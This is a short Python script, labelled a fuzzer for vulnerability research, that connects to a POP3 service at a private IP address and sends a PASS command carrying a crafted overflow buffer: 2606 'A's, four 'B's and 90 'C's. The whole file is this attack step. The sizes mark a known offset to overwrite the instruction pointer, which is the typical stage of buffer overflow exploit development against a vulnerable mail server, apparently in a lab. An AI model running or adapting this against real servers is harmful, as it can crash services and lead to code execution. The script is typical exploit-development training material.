# _FuzzerV4:

"""
INFORMATION ABOUT THE SCRIPT
____________________________

Fuzzer (Vulnerability research)

_____________________________
"""

# !/usr/bin/python3
from socket import *

s = socket(AF_INET, SOCK_STREAM)
buffer = "A" * 2606 + "B" * 4 + "C" * 90

try:
    print("[+] Starting the FuzzerV4 . . .")
    s.connect(("192.168.1.22", 110))

    s.recv(1024)
    s.send("User \r\n".encode())
    s.recv(1024)

    text = 'pass ' + buffer + '\r\n'
    s.send(text.encode())
    print("[+] Finished!")

except Exception as e:
    print("[-] Failed to start the Fuzzer :( ", e)